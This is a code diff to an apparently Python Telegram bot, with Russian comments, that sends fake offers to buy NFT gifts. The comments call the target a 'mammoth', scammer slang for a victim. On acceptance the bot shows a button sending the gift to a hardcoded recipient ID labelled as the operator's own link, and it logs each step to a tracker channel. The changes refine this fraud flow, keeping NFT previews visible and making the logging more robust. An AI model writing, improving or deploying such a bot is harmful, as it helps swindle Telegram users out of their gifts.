@@ -171,7 +171,8 @@ async def cmd_offer(msg: Message):
         "amount": amount, "cur": CURRENCY[cur], 
         "name": url.split('/')[-1].replace('-', ' #'),
         "buyer": msg.from_user.id, "chat": msg.chat.id,
-        "msg": msg.message_id, "bc": msg.business_connection_id, "state": "new"
+        "msg": msg.message_id, "bc": msg.business_connection_id, "state": "new",
+        "lang": lang, "url": url
     }
     
     t = TEXTS[lang]
@@ -182,6 +183,7 @@ async def cmd_offer(msg: Message):
     
     who = msg.from_user.full_name
     
+    # Отправляем оффер
     sent = await bs_send(
         msg.chat.id,
         t["offer_text"].format(who=who, sum=amount, cur=CURRENCY[cur], name=OFFERS[oid]["name"]) + f"\n\n{url}",
@@ -191,7 +193,8 @@ async def cmd_offer(msg: Message):
     if sent:
         OFFERS[oid]["offer_msg"] = sent.message_id
         
-    await tracker_log(f"🆕 offer {oid}: {who} → {amount} {CURRENCY[cur]}")
+    # Логируем в фоне, чтобы ошибка канала не сломала бота
+    asyncio.create_task(tracker_log(f"🆕 offer {oid}: {who} → {amount} {CURRENCY[cur]}"))
 
 # ---------- Кнопки ----------
 @dp.callback_query(F.data.startswith(("acc:", "dec:", "how:", "give:")))
@@ -207,16 +210,15 @@ async def on_btn(cb: CallbackQuery):
     if not o:
         return
 
-    lang = "ru" 
+    lang = o.get("lang", "ru")
     t = TEXTS[lang]
 
     if action == "dec":
         if o["state"] == "accepted":
             return
         o["state"] = "declined"
-        await bs_edit(o["bc"], cb.message.chat.id, cb.message.message_id,
-                      t["declined"])
-        await tracker_log(f"❌ decline {oid}")
+        await bs_edit(o["bc"], cb.message.chat.id, cb.message.message_id, t["declined"])
+        asyncio.create_task(tracker_log(f"❌ decline {oid}"))
         return
 
     if action == "acc":
@@ -224,17 +226,19 @@ async def on_btn(cb: CallbackQuery):
             return
         o["state"] = "accepted"
         
-        text = t["accepted"].format(name=o['name'], sum=o['amount'], cur=o['cur'])
+        # Добавляем url в текст, чтобы превью NFT не пропадало
+        text = t["accepted"].format(name=o['name'], sum=o['amount'], cur=o['cur']) + f"\n\n{o['url']}"
         
         kb = InlineKeyboardMarkup(inline_keyboard=[
+            # ТВОЯ ССЫЛКА
             [InlineKeyboardButton(text=t["btn_give"], url="tg://send_gift?to=8863549439")],
             [InlineKeyboardButton(text=t["btn_how"], callback_data=f"how:{oid}")]
         ])
         
-        # Редактируем сообщение ТОЛЬКО в чате с мамонтом
+        # Редактируем сообщение в чате с мамонтом
         await bs_edit(o["bc"], cb.message.chat.id, cb.message.message_id, text, markup=kb)
         
-        await tracker_log(f"✅ accept {oid} — {o['amount']} {o['cur']} «{o['name']}»")
+        asyncio.create_task(tracker_log(f"✅ accept {oid} — {o['amount']} {o['cur']} «{o['name']}»"))
         return
 
     if action == "how":
